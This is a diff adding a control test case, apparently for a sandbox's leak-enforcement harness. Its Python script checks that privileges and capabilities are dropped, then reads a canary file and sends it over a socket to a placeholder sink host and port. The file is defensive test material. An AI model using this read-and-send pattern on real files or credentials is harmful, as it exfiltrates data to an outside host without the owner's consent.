@@ -1,0 +1,38 @@
+name = "control-privilege-boundary"
+kind = "control"
+policy = "recommended"
+
+[[files]]
+path = "payload.txt"
+contents = "{CANARY}"
+
+[[files]]
+path = "boundary.py"
+contents = """
+import ctypes, errno, os, socket
+if os.environ.get('MARSH_LEAK_ENFORCEMENT') == 'privileged':
+    fields = dict(line.split(':', 1) for line in open('/proc/self/status') if ':' in line)
+    for name in ('CapEff', 'CapPrm', 'CapInh', 'CapAmb'):
+        assert int(fields[name], 16) == 0, (name, fields[name])
+    assert int(fields['NoNewPrivs']) == 1
+    if os.geteuid() == 0:
+        assert int(fields['CapBnd'], 16) == 0
+        assert ctypes.CDLL(None).prctl(27, 0, 0, 0, 0) & 3 == 3
+    try:
+        os.readlink('/proc/%d/fd/0' % os.getppid())
+    except OSError as error:
+        assert error.errno in (errno.EACCES, errno.EPERM), error
+    else:
+        raise AssertionError('governed command can inspect loader descriptors')
+payload = open('payload.txt', 'rb').read()
+s = socket.create_connection(('{SINK_HOST}', {SINK_PORT}))
+s.sendall(payload)
+s.close()
+"""
+
+[[steps]]
+run = "python3 boundary.py"
+expect = "accepted"
+
+[oracle]
+encodings = ["raw"]
